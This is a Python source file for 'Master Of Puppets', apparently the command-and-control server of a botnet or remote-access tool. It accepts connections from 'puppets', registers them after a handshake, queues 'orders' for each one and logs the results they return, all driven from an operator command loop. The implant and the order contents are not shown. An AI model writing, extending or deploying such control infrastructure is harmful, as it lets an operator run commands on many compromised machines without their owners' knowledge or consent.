# Main source of MOP - Master Of Puppets
import os
import errno
import socket
import signal
import threading
import queue
from uuid import uuid1 as getUUID
import sys
import time
import select
from mcp import *
from prompt import Control

LOG_ENABLED = True
LOG_PATH = "./log.txt"
LOG_STDOUT = False

lock = threading.Lock()
def log(msg, path=LOG_PATH):
    if not LOG_ENABLED:
        return
    if LOG_STDOUT:
        print(msg)
    with lock:
        with open(path, "a+") as f:
            f.write(msg + "\n")

# Goofy as fuck db
puppets = {}
def handlePuppet(conn, addr, uuid):
    buffer = McpBuffer(conn)
    # Handshake
    handshake = False
    try:
        frame = buffer.nextPacket()
        if frame.method == "HEY":
            puppets[uuid] = frame.args
            puppets[uuid]["addr"] = addr
            puppets[uuid]["queue"] = queue.Queue() # Initialize queue for incoming orders
            buffer.sendPacket(McpWelcome(str(uuid)))
            log(f"({uuid}) {addr[0]} CONNECT")
            handshake = True
        else:
            raise
    except Exception:
        buffer.sendPacket(McpBruh("Bad handshake"))
        log(f"({uuid}) FAILED HANDSHAKE")
        return

    # Start sending tasks 
    while handshake:
        q = puppets[uuid]["queue"]
        try:
            result = buffer.nextPacket(timeout=1)
            text = result.args["result"]
            log(f"({uuid}) ORDER RESULT: \n{text}")
        except BlockingIOError: # No results yet
            try:
                # Wait until an order comes into the queue
                # Don't block, so we can also recive packets, don't want to add another thread
                order = q.get(block=False, timeout=1)
                buffer.sendPacket(order)
                log(f"({uuid}) SENT ORDER {order}")
            except queue.Empty: # No orders yet
                continue
        except ConnectionResetError:
            log(f"({uuid}) DISCONNECT")
            break
        except McpBadRequest:
            log(f"({uuid}) MALFORMED CONNECTION")
            buffer.sendPacket(McpBruh("Malformed or illegal packet"))
            break

    puppets.pop(uuid)
    conn.close()

def listener(s):
    print("Listening on port", host[1])
    while True:
        conn, addr = s.accept()
        uuid = str(getUUID()).split("-")[0]
        t = threading.Thread(name=uuid, target=handlePuppet, args=(conn, addr, uuid), daemon=True)
        t.start()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <port>")
        sys.exit(1)

    open(LOG_PATH, "w").close() # clear log file

    host = ("0.0.0.0", int(sys.argv[1]))
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(host)
    s.listen(128)
        
    def sigintHandler(sig, frame):
        s.close()
        sys.exit(0)

    signal.signal(signal.SIGINT, sigintHandler)
    listenerThread = threading.Thread(target=listener, args=(s,), daemon=True)
    listenerThread.start()
    
    ctrl = Control(puppets)
    ctrl.cmdloop()
